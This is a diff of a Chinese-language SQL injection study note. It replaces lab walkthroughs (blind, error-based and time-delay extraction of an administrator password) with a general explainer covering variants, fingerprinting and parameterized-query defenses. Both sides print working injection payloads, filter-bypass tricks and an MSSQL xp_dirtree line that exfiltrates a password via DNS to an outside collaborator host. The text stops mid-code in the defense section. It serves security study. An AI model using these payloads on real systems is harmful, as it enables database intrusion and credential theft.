@@ -1,591 +1,376 @@
-# SQL Injection
+# SQL Injection (SQLi) — 漏洞深度剖析
 
-> **参考：** [PostgreSQL](../../数据库/PostgreSQL.md) | [Oracle](../../数据库/Oracle.md) | [MySQL](../../数据库/MySQL.md) | [MSSQL](../../数据库/Microsoft%20SQL%20Server.md) | [数据库对比](../../数据库/数据库对比.md)
+## 概述
 
-## 注释符号与 URL 编码规则
+SQL injection (SQLi) 是一种允许攻击者干扰应用程序向数据库发出的查询的 Web 安全漏洞。攻击者可以借此查看正常情况下无法检索的数据——可能包括属于其他用户的数据，或应用程序可以访问的任何其他数据。在许多情况下，攻击者可以修改或删除这些数据，导致应用程序的内容或行为发生持久性变更。在某些场景下，攻击者可以将 SQL 注入升级为对底层服务器或后端基础设施的完全控制，甚至发起拒绝服务攻击。
 
-### `--` vs `#` vs `/**/`：什么时候用哪个？
-
-| 注释符 | 适用数据库 | 关键条件 | 示例 |
-|--------|-----------|---------|------|
-| `-- ` | 所有 | **MySQL 中 `--` 后必须有空格或控制字符**，其他数据库可有可无 | `' OR 1=1 -- ` |
-| `--%20` | 所有 | 同上，URL 编码的空格，适合 HTTP 传输 | `' OR 1=1 --%20` |
-| `--+` | 所有 | `+` 在 URL 中解码为空格，确保 MySQL 兼容 | `' OR 1=1 --+` |
-| `#` | **仅 MySQL / MariaDB** | PostgreSQL / Oracle / MSSQL 都不支持 | `' OR 1=1 #` |
-| `%23` | **仅 MySQL / MariaDB** | `#` 的 URL 编码形式 | `' OR 1=1 %23` |
-| `/**/` | 所有 | 多行注释，最通用；也可替代空格绕过过滤 | `'/**/OR/**/1=1/**/` |
-
-**为什么 `#` 只有 MySQL 能用？**
-
-MySQL 将 `#` 设计为单行注释符（兼容一些历史 shell 脚本习惯）。PostgreSQL、Oracle、MSSQL 都不认 `#`。如果在非 MySQL 数据库上用 `#`，会被当作普通字符或运算符，导致语法错误或注入失败。
-
-**为什么 `--` 在 MySQL 中需要后面跟空格？**
-
-MySQL 对 `--` 的解析遵循 SQL 标准：`--` 后必须跟一个空格（或换行/制表符）才算注释开始。如果写 `--SOMETHING`，MySQL 会认为这是一个以 `--` 开头的标识符而非注释。`--+` 中的 `+` 在 URL 解码后变成空格，所以 `--+` 是 MySQL 盲注的常见结尾。
-
-**快速判断规则：**
-- 能确认是 MySQL → 优先用 `#` 或 `%23`（不需要管空格问题）
-- 不确定数据库类型 → 用 `-- `（带空格）或 `--+`（最通用，覆盖所有数据库 + URL 传输）
-- 空格被过滤 → 用 `/**/` 替代所有空白字符
-
-### URL 编码：什么时候必须编码？
-
-核心原则：**当特殊字符在 HTTP 传输层有特定含义时，必须编码；如果字符只对 SQL 有意义、对 HTTP 无影响，可以不编码。**
-
-#### 必须编码的字符
-
-| 字符 | URL 编码 | HTTP 层的含义 | 场景 |
-|------|---------|-------------|------|
-| `;` | `%3B` | GET 参数分隔符 / Cookie 属性分隔符 | **Cookie 注入中分号必须先编码**，否则被当作 cookie 结束 |
-| `=` | `%3D` | 参数键值分隔符 | 如果 `=` 是 payload 的一部分而非分隔符，需要编码 |
-| `&` | `%26` | GET 多参数分隔符 | GET 注入中 `&` 会切断当前参数 |
-| `#` | `%23` | URL 片段锚点，浏览器不发送 `#` 之后内容 | GET 注入中用 `#` 注释必须编码 |
-| 空格 | `%20` 或 `+` | URL 中空格的分隔语意 | 确保空格被正确传输到 SQL 中 |
-| `%` | `%25` | 转义前缀 | 当 `%` 是字面值而非编码前缀时（如 LIKE '%x%'） |
-
-#### 可以不编码的字符
-
-| 字符 | 说明 |
-|------|------|
-| `'` (单引号) | HTTP 不特殊处理，直接传输即可（除非应用层做了额外过滤） |
-| `(` `)` | HTTP 允许括号出现在 URL 中 |
-| `>` `<` | 理论上应编码，但实践中大多数服务器接受原始形式 |
-| `\|\|` | 无 HTTP 特殊含义 |
-
-#### 关键场景速查
-
-```
-场景一：GET 参数注入
-  URL: ?id=1' AND 1=1 --
-  问题：-- 后面的空格可能丢失；# 会被浏览器当作锚点不发送
-  解决：?id=1' AND 1=1 --+      （+ 解码为空格，最通用）
-        ?id=1' AND 1=1 %23      （仅 MySQL，%23 = #）
-
-场景二：Cookie 注入
-  Cookie: TrackingId=xxx' AND 1=1 --
-  问题：; 是 Cookie 分隔符，直接使用会截断
-  解决：TrackingId=xxx' %3B SELECT pg_sleep(5) --+
-        （分号 → %3B，保证被当作 SQL 分号而非 Cookie 分隔符）
-
-场景三：POST body 注入（JSON / form-urlencoded）
-  JSON 中：{"id": "1' AND 1=1 --"}  → 直接写，无需额外编码
-  form 中：id=1' AND 1=1 --         → 同 GET，注意 & 和 = 问题
-
-场景四：XML / XXE 嵌入 SQL 注入
-  XML 中的 < > " 等必须用实体编码或 URL 编码
-  且不能保留换行和缩进（会破坏 SQL 语法）
-```
-
-#### 实战口诀
-
-1. **Cookie 里看到 `;` → 先想到 `%3B`**
-2. **不确定用什么注释 → 用 `--+`（覆盖所有库 + URL 安全）**
-3. **GET 参数中 `#` → 必须编码成 `%23`，否则浏览器不发 `#` 后面的内容**
-4. **判断出 MySQL 后 → 换成 `#` / `%23`，更简洁安全**
+SQL 注入已导致多起广为报道的重大数据泄露事件，造成声誉损害和监管罚款。部分案例中，攻击者获取了组织系统的持久后门，导致长期隐蔽的持续入侵。
 
 ---
 
-## 盲注方法论 / Blind SQL Injection Methodology
+## 根本原因
 
-从以下五个 Lab 中提炼的通用思路框架：
+SQL 注入的**根本原因**是应用程序将用户输入与 SQL 查询逻辑混为一谈。当开发者使用字符串拼接构造 SQL 语句时，用户输入的语法元素（如单引号 `'`、注释符 `--`、关键字 `OR`）可以修改原始查询的语义结构。这不是 SQL 语言本身的缺陷，而是**数据与指令边界模糊**导致的经典注入问题。
 
-### 阶段一：注入点探测与确认
+从更底层的角度分析，SQL 注入的存在需要三个条件同时满足：
 
-| 步骤 | 操作 | 目的 |
-|------|------|------|
-| 1.1 触发异常 | 输入单引号 `'` | 观察响应变化（500/报错/页面内容变化），确认参数是否被拼入 SQL |
-| 1.2 修复语法 | 输入双引号 `''` 或注释符 `--` | 如果异常消失，说明单引号确实破坏了查询结构，确认注入点 |
-| 1.3 确定注入类型 | 根据上下文选择闭合方式 | cookie 注入 vs GET/POST 参数注入；字符串型 vs 数字型 |
-
-### 阶段二：数据库类型识别
-
-不同数据库有不同的指纹特征：
-
-| 数据库 | 指纹测试 | 说明 |
-|--------|----------|------|
-| Oracle | `SELECT '' FROM dual` 或 `ROWNUM` | `dual` 是 Oracle 特有的虚拟表 |
-| PostgreSQL | `pg_sleep()` | PostgreSQL 特有函数 |
-| MySQL | `SLEEP()` 或 `#` 注释符 | MySQL 特有 |
-| 通用 | 字符串连接符 `\|\|` vs `+` vs `CONCAT()` | Oracle/PostgreSQL 用 `\|\|`，MSSQL 用 `+`，MySQL 用 `CONCAT()` 或空格 |
-
-**关键思路**：不要猜测数据库类型，用数据库特有的函数或语法去验证。
-
-### 阶段三：信息提取策略选择
-
-根据应用对查询结果的处理方式，选择对应的盲注策略：
-
-| 策略 | 适用场景 | 核心原理 | Lab 示例 |
-|------|----------|----------|----------|
-| **条件响应** (Conditional Responses) | 页面内容因查询结果不同而变化（如"Welcome back"消息） | 构造布尔条件，通过页面内容差异推断真假 | Lab 1 |
-| **条件错误** (Conditional Errors) | 错误信息可见或 HTTP 状态码可区分 | 条件为真时触发除零等可控错误，通过是否报错推断 | Lab 2, 3 |
-| **时间延迟** (Time Delays) | 页面响应无任何内容差异 | 条件为真时触发延迟函数，通过响应时间推断 | Lab 4 |
-| **带外交互** (Out-of-Band) | 数据库有出站网络访问能力 | 构造 DNS/HTTP 请求到外部服务器，通过外带信道获取数据 | Lab 5 |
-| **可见错误** (Visible Errors) | 错误信息直接回显在页面 | 利用 CAST 等类型转换函数，将数据嵌入错误消息中直接读出 | Lab 3 |
-
-**选择逻辑**：先试条件响应（最省力），不行再试条件错误，再不行试时间延迟，最后考虑 OOB。
-
-### 阶段四：数据提取三步走
-
-无论哪种盲注策略，数据提取都遵循相同的三步：
-
-```
-1. 确认表是否存在 → 2. 确认目标行是否存在 → 3. 获取目标列长度 → 4. 逐字符破解目标数据
-```
-
-#### 4.1 确认表存在
-
-```sql
--- PostgreSQL / MySQL 通用
-AND (SELECT 'a' FROM users LIMIT 1)='a'
-
--- Oracle（需要 FROM dual 或使用 ROWNUM）
-||(SELECT '' FROM users WHERE ROWNUM=1)||'
-```
-
-#### 4.2 确认目标行存在
-
-```sql
--- PostgreSQL
-AND (SELECT username FROM users WHERE username='administrator')='administrator'
-
--- Oracle（条件错误法）
-||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-```
-
-#### 4.3 获取数据长度
-
-```sql
--- 条件响应法 (PostgreSQL)
-AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20
-
--- 条件错误法 (Oracle)
-||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-
--- 时间延迟法 (PostgreSQL)
-'; SELECT CASE WHEN LENGTH(password)=20 THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
-```
-
-**注意**：使用二分查找或 `>=N` 方式逼近长度，比逐次等号判断更高效。使用 Burp Intruder 时可用 Sniper 模式逐次测试。
-
-#### 4.4 逐字符破解
-
-```sql
--- SUBSTRING / SUBSTR 函数语法因数据库而异
--- PostgreSQL: SUBSTRING(string, position, length)
--- Oracle: SUBSTR(string, position, length)
--- MySQL: SUBSTRING(string, position, length)
-```
-
-使用 Burp Intruder 的 **Cluster bomb** 模式：
-- Payload 1：位置 (1-20)
-- Payload 2：字符 (a-z, 0-9)
-
-### 阶段五：常见障碍与解决思路
-
-| 障碍 | 表现 | 解决思路 |
-|------|------|----------|
-| **字符截断** | payload 后半部分被截掉 | 1) 缩短 payload；2) 删除 cookie 原始值释放空间（Lab 3 技巧）；3) 换用更短的函数名 |
-| **注释符被过滤** | `--` 无效 | 尝试 `#`（MySQL）或 `/* */` 多行注释 |
-| **空格被过滤** | 语法错误 | 用 `/**/`、`%09`(TAB)、`%0a`(换行) 替代空格 |
-| **等于号被过滤** | `=` 无法使用 | 用 `LIKE`、`REGEXP`、`>` `<`、`BETWEEN` 替代 |
-| **单引号被转义** | `\'` 无法闭合 | 如果数据库是 Oracle，尝试 `\|\|` 拼接而不是引号闭合 |
-| **多语句不支持** | `;` 分隔无效 | 改用表达式注入（`\|\|`、`AND`、`OR` 等），不用分号 |
+1. **应用程序将用户输入嵌入 SQL 查询** — 输入成为查询字符串的一部分
+2. **输入未经充分转义或过滤** — 恶意字符得以保留其在 SQL 中的语法含义
+3. **数据库以应用身份执行查询** — 权限边界与业务逻辑未隔离
 
 ---
 
-## Lab 1: Blind SQL injection with conditional responses
+## 触发条件与注入位置
 
-- **注入点**：Cookie 参数 `TrackingId`
-- **数据库**：PostgreSQL
-- **策略**：条件响应法 —— 页面在查询成功时显示 "Welcome back"
-- **目标**：获取 `users` 表中 `username='administrator'` 的 `password`
+### 注入位置
 
-### Step 1: 验证 users 表存在
+SQL 注入不仅存在于 `SELECT` 的 `WHERE` 子句中，以下位置同样可能出现：
 
-```sql
-TrackingId=QlwkDggWZ9kB8CzU' AND (SELECT 'a' FROM users LIMIT 1)='a
-```
+- `UPDATE` 语句中的更新值或 `WHERE` 子句
+- `INSERT` 语句中的插入值
+- `SELECT` 语句中的表名或列名
+- `SELECT` 语句中的 `ORDER BY` 子句
+- Cookie、Header、JSON/XML 请求体等所有可控输入
 
-**执行逻辑**：
-- `SELECT 'a' FROM users LIMIT 1`：尝试从 `users` 表查询字面量 `'a'`
-- 如果 `users` 表存在且有数据 → 子查询返回 `'a'`
-- 外层比较：`'a' = 'a'` → TRUE → 页面显示 "Welcome back"
-- 如果 `users` 表不存在 → 查询失败 → 页面不显示 "Welcome back"
+### 检测方法
 
-**优点**：不依赖具体列名（只验证表是否存在），使用 `LIMIT 1` 减少负载。
+人工检测 SQL 注入的系统性方法是通过每个输入点提交以下五类 payload 并观察应用响应差异：
 
-### Step 2: 确定 password 长度
-
-```sql
--- 先判断 >=10
-TrackingId=QlwkDggWZ9kB8CzU' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>=10 AND '1'='1
--- 结果：Welcome back → 长度 >=10
-
--- 再判断 >=20
-TrackingId=QlwkDggWZ9kB8CzU' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>=20 AND '1'='1
--- 结果：Welcome back → 长度 >=20
-
--- 确认 =20
-TrackingId=QlwkDggWZ9kB8CzU' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20 AND '1'='1
--- 结果：Welcome back → 长度 = 20
-```
-
-**改进建议**：使用 Sniper 模式 + 二分查找可以更快收敛。
-
-### Step 3: 逐字符爆破密码
-
-使用 Burp Intruder Cluster bomb 模式：
-
-```sql
-TrackingId=QlwkDggWZ9kB8CzU' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§' AND '1'='1;
-```
-
-- Payload 1：位置 1-20
-- Payload 2：字符集 a-z, 0-9
-
-**最终密码**：`d73k6yg4xh9vjpygf33j`
+| 测试类型 | Payload 示例 | 观测指标 |
+|---------|-------------|---------|
+| **引号/语法字符** | `'` | 是否触发错误或其他异常 |
+| **等价语法** | 使条件回到原值的 SQL 语法 | 响应是否与原始请求一致 |
+| **布尔条件** | `OR 1=1` vs `OR 1=2` | 响应是否有系统性差异 |
+| **时间延迟** | 数据库特定的 sleep/wait 函数 | 响应时间为差异 |
+| **带外交互 (OAST)** | 触发 DNS/HTTP 请求的 payload | 外部服务器是否收到回调 |
 
 ---
 
-## Lab 2: Blind SQL injection with conditional errors
+## 攻击变体
 
-- **注入点**：Cookie 参数 `TrackingId`
-- **数据库**：Oracle
-- **策略**：条件错误法 —— 通过是否触发 500 错误来判断条件真假
-- **目标**：获取 `users` 表中 `username='administrator'` 的 `password`
+### 1. 检索隐藏数据 (Retrieving Hidden Data)
 
-### Step 1: 确认注入点
+**利用场景**：查询结果被额外条件限制（如 `released=1`），攻击者通过注释或 `OR` 条件绕过。
 
+**原始查询**：
 ```sql
--- 单引号破坏语法
-TrackingId=XBx3CA3eobxwQaIx'
--- 结果：500 错误
-
--- 双引号修复语法
-TrackingId=XBx3CA3eobxwQaIx''
--- 结果：200 正常
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 ```
 
-### Step 2: 确认数据库为 Oracle
-
-```sql
-TrackingId=XBx3CA3eobxwQaIx'||(SELECT '' FROM dual)||'
--- 结果：无报错 → 确认 Oracle 数据库
+**攻击示例 — URL 参数注入**:
+```
+https://insecure-website.com/products?category=Gifts'--
 ```
 
-`||` 是 Oracle 的字符串连接符；`dual` 是 Oracle 特有的虚拟表。如果这两个都生效，就是 Oracle。
-
-### Step 3: 验证 users 表存在
-
+**注入后实际执行的 SQL**:
 ```sql
-TrackingId=XBx3CA3eobxwQaIx'||(SELECT '' FROM users WHERE ROWNUM=1)||'
--- 结果：200 → users 表存在
+SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
 ```
 
-Oracle 用 `ROWNUM` 而非 `LIMIT` 限制行数。
+`--` 是 SQL 注释指示符。剩余部分 `AND released = 1` 被注释掉，所有产品（包括未发布的）均被返回。
 
-### Step 4: 验证 administrator 用户存在（引入条件错误技巧）
-
-```sql
-TrackingId=XBx3CA3eobxwQaIx'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+**扩展到任意类别的所有产品**:
+```
+https://insecure-website.com/products?category=Gifts'+OR+1=1--
 ```
 
-**Payload 解析**：
-- `CASE WHEN (1=1)`：条件始终为真
-- `THEN TO_CHAR(1/0)`：执行除零操作 → 触发错误
-- `ELSE ''`：条件为假时返回空字符串（不触发错误）
-- `FROM users WHERE username='administrator'`：如果该用户存在，子查询返回一行 → CASE 被执行 → 除零错误
-
-**结果**：HTTP 500 → 用户存在且条件错误技术可行
-
-**核心思路**：`TO_CHAR(1/0)` 是 Oracle 盲注中制造可控错误的标准方法。
-
-### Step 5: 确定密码长度
-
+注入后：
 ```sql
-TrackingId=XBx3CA3eobxwQaIx'||(SELECT CASE WHEN LENGTH(password)=§12§ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
 ```
 
-使用 Burp Intruder Sniper 模式测试数字 1-30。
-**结果**：长度 = 20
+由于 `1=1` 始终为真，查询返回所有产品。
 
-### Step 6: 逐字符爆破密码
+> 警告：注入 `OR 1=1` 需谨慎。即使在该上下文中无害，应用程序可能在多个查询中复用同一输入数据。如果该条件到达 `UPDATE` 或 `DELETE` 语句，可能导致数据意外丢失。
 
+### 2. 颠覆应用逻辑 (Subverting Application Logic)
+
+**利用场景**：登录认证。攻击者通过注释移除密码校验，以任意用户身份登录。
+
+**原始查询**：
 ```sql
-TrackingId=XBx3CA3eobxwQaIx'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
 ```
 
-- Payload 1：位置 1-20
-- Payload 2：字符集 a-z, 0-9
+**攻击 payload** — 用户名输入 `administrator'--`，密码留空：
+```sql
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+```
 
-**Oracle 注意**：使用 `SUBSTR()` 而非 PostgreSQL 的 `SUBSTRING()`。
+密码检查部分被注释掉，查询返回 `administrator` 用户记录，攻击者成功以该用户身份登录。
 
-**最终密码**：`6459v4yiqmevI4h7h7jc`
+### 3. UNION 攻击 (Retrieving Data from Other Tables)
+
+**利用场景**：查询结果在应用响应中可观察。攻击者使用 `UNION` 关键字追加第二个 `SELECT` 查询，从一个或多个表中提取数据。
+
+**原始查询**：
+```sql
+SELECT name, description FROM products WHERE category = 'Gifts'
+```
+
+**攻击 payload**：
+```
+' UNION SELECT username, password FROM users--
+```
+
+注入后查询同时返回产品信息和用户凭据。
+
+**UNION 攻击的技术步骤**：
+
+1. **确定列数** — 两种方法：
+   - `ORDER BY` 递增法：`' ORDER BY 1--`、`' ORDER BY 2--`...直到报错
+   - `UNION SELECT NULL` 法：`' UNION SELECT NULL--`、`' UNION SELECT NULL,NULL--`...直到不报错
+   
+   使用 `NULL` 的原因：`NULL` 可转换为所有常见数据类型，最大化兼容性
+
+2. **确定字符串列** — 提交一系列 `UNION SELECT` payload，在各列位置依次放置字符串值 `'a'`：
+   ```
+   ' UNION SELECT 'a',NULL,NULL,NULL--
+   ' UNION SELECT NULL,'a',NULL,NULL--
+   ```
+   不报错且响应中出现 `a` 的列即为字符串兼容列
+
+3. **提取数据**：
+   ```
+   ' UNION SELECT username, password FROM users--
+   ```
+
+4. **单列多值提取**（仅一列可用时）— 使用字符串拼接：
+   - Oracle: `' UNION SELECT username || '~' || password FROM users--`
+   - MySQL: `' UNION SELECT CONCAT(username, '~', password) FROM users--`
+
+**数据库特定差异**：
+
+| 特性 | Oracle | MySQL | MSSQL/PostgreSQL |
+|------|--------|-------|-----------------|
+| FROM 子句必需 | 是 — 使用 `FROM dual` | 否 | 否 |
+| 注释符 | `--` | `-- ` (空格) 或 `#` | `--` |
+| 字符串拼接 | `\|\|` | `CONCAT()` 或空格 | `+` (MSSQL) / `\|\|` (PG) |
+
+### 4. 盲 SQL 注入 (Blind SQL Injection)
+
+当应用不返回查询结果或数据库错误详情时，利用仍可进行，但需要使用间接推断技术。
+
+#### 4a. 基于布尔条件的条件响应 (Conditional Responses)
+
+**前提**：应用程序行为因查询是否返回数据而有差异（如 "Welcome back" 消息）。
+
+**工作机制**：注入布尔条件，通过响应差异逐位推断数据。
+
+```
+Cookie: TrackingId=xyz' AND '1'='1   → 返回 "Welcome back"（条件为真）
+Cookie: TrackingId=xyz' AND '1'='2   → 无 "Welcome back"（条件为假）
+```
+
+利用此差异逐字符提取密码：
+```
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm   → true
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't   → false
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's   → true
+```
+第一个字符确定为 `s`，以此类推。
+
+#### 4b. 基于条件错误 (Conditional Errors)
+
+**前提**：布尔条件注入无效（响应无差异），但数据库错误会导致响应差异。
+
+**工作机制**：使用 `CASE WHEN` 在条件为真时触发数据库错误（如除零）：
+
+```
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a   → 无错误（条件为假）
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a   → 错误（条件为真）
+```
+
+**完整数据提取 payload**：
+```
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
+
+#### 4c. 详细错误消息泄露 (Verbose Error Messages)
+
+**工作机制**：数据库配置错误导致详细错误信息暴露出查询的实际数据。使用 `CAST()` 将字符串数据强制转换为不兼容类型：
+
+```sql
+CAST((SELECT example_column FROM example_table) AS int)
+```
+
+错误回报类似：`ERROR: invalid input syntax for type integer: "Example data"`——数据直接出现在错误消息中，实现了从盲注到可见注入的转换。
+
+#### 4d. 基于时间延迟 (Time Delays)
+
+**适用场景**：应用捕获并优雅处理数据库错误，条件响应和条件错误方法均无效。
+
+**工作机制**：SQL 查询通常是同步处理的，延迟查询执行会同步延迟 HTTP 响应。
+
+按数据库类型区分：
+```
+MSSQL:     '; IF (1=2) WAITFOR DELAY '0:0:10'--     → 无延迟
+MSSQL:     '; IF (1=1) WAITFOR DELAY '0:0:10'--     → 延迟 10 秒
+MySQL:     ' AND IF(1=2, SLEEP(10), 0)--             → 无延迟
+PostgreSQL:' AND (SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
+Oracle:    ' AND (SELECT CASE WHEN (1=2) THEN DBMS_LOCK.SLEEP(10) ELSE 0 END FROM dual)--
+```
+
+**完整数据提取** (MSSQL)：
+```
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
+```
+
+#### 4e. 带外 (OAST) 数据外带
+
+**适用场景**：SQL 查询异步执行（在独立线程中），响应不依赖查询结果、错误或时间。
+
+**工作机制**：触发数据库向攻击者控制的服务器发起 DNS/HTTP 请求，将数据编码到请求中。
+
+**为什么 OAST 是盲注中最强的技术**：
+- DNS 协议通常是生产网络中允许自由流通的（DNS 是基础服务）
+- 可以**直接**将数据外带，而非逐字符推断
+- 比时间盲注快几个数量级
+
+**MSSQL 触发 DNS 查询示例**：
+```
+'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+```
+
+**完整数据外带**（将管理员密码编码到 DNS 子域名中）：
+```
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
+```
+
+DNS 查询日志显示：`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`——密码直接出现在域名前缀中。
+
+### 5. 二阶 SQL 注入 (Second-Order SQL Injection)
+
+**一阶注入**：应用程序在接收 HTTP 请求时直接将用户输入不安全地嵌入 SQL 查询。
+
+**二阶注入**：应用程序先安全地将用户输入存储到数据库（此时无注入），随后在另一个 HTTP 请求中取出存储的数据，并**不安全地**将其嵌入 SQL 查询。
+
+**根本原因**：开发者对"数据库中的数据"赋予不合理的信任。首次存储时做了参数化处理所以安全，第二次使用时由于数据来自"可信源"（自己的数据库）而放松了警惕，直接拼接。这是一种**信任边界错位**。
+
+### 6. 不同上下文中的 SQL 注入
+
+SQL 注入可利用任何被应用作为 SQL 查询处理的可控输入——不限于 URL 查询字符串。JSON、XML 等格式的请求体同样可能。不同格式提供了不同的混淆途径，可绕过 WAF 等防御：
+
+**XML 编码绕过示例** — 利用 XML 转义序列 (`&#x53;`) 编码 `S` 字符：
+```xml
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+```
+
+XML 转义序列在服务器端解码后再传给 SQL 解释器，绕过了检查原始关键词的过滤规则。
 
 ---
 
-## Lab 3: Visible error-based SQL injection
+## 数据库信息收集
 
-- **注入点**：Cookie 参数 `TrackingId`
-- **数据库**：PostgreSQL
-- **策略**：可见错误法 —— 利用 CAST 类型转换将数据嵌入错误消息中直接显示
-- **目标**：获取 `users` 表中 `username='administrator'` 的 `password`
+利用 SQL 注入时通常需要了解数据库结构。四步法：
 
-### Step 1: 确认注入点
+### 1. 判断数据库类型和版本
 
+| 数据库 | 版本查询 |
+|--------|---------|
+| Microsoft, MySQL | `SELECT @@version` |
+| Oracle | `SELECT * FROM v$version` |
+| PostgreSQL | `SELECT version()` |
+
+通过 `UNION` 注入：
+```
+' UNION SELECT @@version--
+```
+
+### 2. 列出数据库内容
+
+**非 Oracle 数据库**（使用 information_schema）：
 ```sql
-TrackingId=OTKrj23YuTg0vnN9'
--- 返回错误（含完整 SQL 片段）：
--- Unterminated string literal started at position 52 in SQL 
--- SELECT * FROM tracking WHERE id = 'OTKrj23YuTg0vnN9''. Expected char
+-- 列出表
+SELECT * FROM information_schema.tables
 
-TrackingId=OTKrj23YuTg0vnN9''
--- 正常返回
+-- 列出指定表的列
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
 ```
 
-### Step 2: 判断数据库类型
-
+**Oracle 数据库**（使用 all_* 视图）：
 ```sql
--- Oracle 测试
-TrackingId=OTKrj23YuTg0vnN9'||(SELECT '' FROM dual)||'
--- 返回：ERROR: relation "dual" does not exist → 不是 Oracle
+-- 列出表
+SELECT * FROM all_tables
 
--- 结论：PostgreSQL（结合后续 pg_sleep 等验证）
+-- 列出指定表的列
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
 ```
 
-### Step 3: 验证 users 表存在
+### 3. 跨数据库特性差异速查
 
-```sql
--- 通用方法（PostgreSQL）
-TrackingId=OTKrj23YuTg0vnN9' AND (SELECT 'a' FROM users LIMIT 1)='a'--
-```
-
-注意这里使用 `--` 注释掉后续内容，避免语法错误。
-
-### Step 4: 利用 CAST 泄露数据（可见错误法的核心）
-
-```sql
--- 先测试 CAST 语法是否可用
-TrackingId=OTKrj23YuTg0vnN9' AND CAST((SELECT 1) AS int)--
--- 返回：ERROR: argument of AND must be type boolean, not type integer
--- (CAST 返回整数而非布尔值，语法不对)
-
--- 修正为布尔表达式
-TrackingId=OTKrj23YuTg0vnN9' AND 1=CAST((SELECT 1) AS int)--
--- 正常返回 → CAST 语法可用
-```
-
-**关键洞察**：`CAST()` 将数据转换为数字类型失败时会报错，且错误消息中包含原始数据内容。这让我们可以直接"看"到查询结果。
-
-### Step 5: 字符截断问题与解决
-
-```sql
--- 原始 payload（被截断）
-TrackingId=OTKrj23YuTg0vnN9' AND 1=CAST((SELECT username FROM users) AS int)--
--- 返回：Unterminated string literal...Expected char
--- 原因：payload 太长，-- 注释部分被截断
-
--- 解决方案：删除原始 TrackingId 值，只保留单引号
-TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
--- 返回：ERROR: more than one row returned by a subquery used as an expression
-```
-
-**这个技巧很重要**：当 payload 被截断时，可以考虑删除原始参数值来释放字符空间。
-
-### Step 6: 限制返回行数，泄露数据
-
-```sql
-TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
--- 返回：ERROR: invalid input syntax for type integer: "administrator"
--- 用户名泄露！
-
-TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
--- 返回：ERROR: invalid input syntax for type integer: "zrk05uh9ektq4f51j9zv"
--- 密码泄露！
-```
-
-**CAST 可见错误法的核心原理**：
-```
-SELECT CAST('字符串数据' AS int) → 类型转换失败
-错误消息包含：invalid input syntax for type integer: "字符串数据"
-数据被直接嵌入了错误消息中
-```
-
-**最终密码**：`zrk05uh9ektq4f51j9zv`
+| 特性 | MySQL | MSSQL | Oracle | PostgreSQL |
+|------|-------|-------|--------|------------|
+| 字符串拼接 | `CONCAT(a,b)` | `a+b` | `a\|\|b` | `a\|\|b` |
+| 注释 | `-- ` / `#` | `--` | `--` | `--` |
+| 堆叠查询 | 取决于驱动 | `;` | `;` 需 `BEGIN` | `;` |
+| 时间延迟 | `SLEEP(n)` | `WAITFOR DELAY` | `DBMS_LOCK.SLEEP(n)` | `pg_sleep(n)` |
 
 ---
 
-## Lab 4: Blind SQL injection with time delays and information retrieval
+## 防御方案
 
-- **注入点**：Cookie 参数 `TrackingId`
-- **数据库**：PostgreSQL
-- **策略**：时间延迟法 —— 通过是否触发延迟来判断条件真假
-- **目标**：获取 `users` 表中 `username='administrator'` 的 `password`
+### 1. 参数化查询 / Prepared Statements（根本性修复）
 
-### Step 1: 测试延迟函数
+参数化查询将 SQL 结构与用户数据分离，确保用户输入永远不会干扰查询语义：
 
-```sql
--- 表达式注入方式
-TrackingId=qp5zQHYcGlRtSzCL' || pg_sleep(10) --+
--- 结果：触发 10 秒等待 → pg_sleep 可用
+```java
+// 不安全（字符串拼接）
+String query = "SELECT * FROM products WHERE category = '" + input + "'";
+Statement statement = connection.createStatement();
+ResultSet resultSet = statement.executeQuery(query);
+
+// 安全（参数化查询）
+PreparedStatement statement = connection.prepareStatement(
+    "SELECT * FROM products WHERE category = ?"
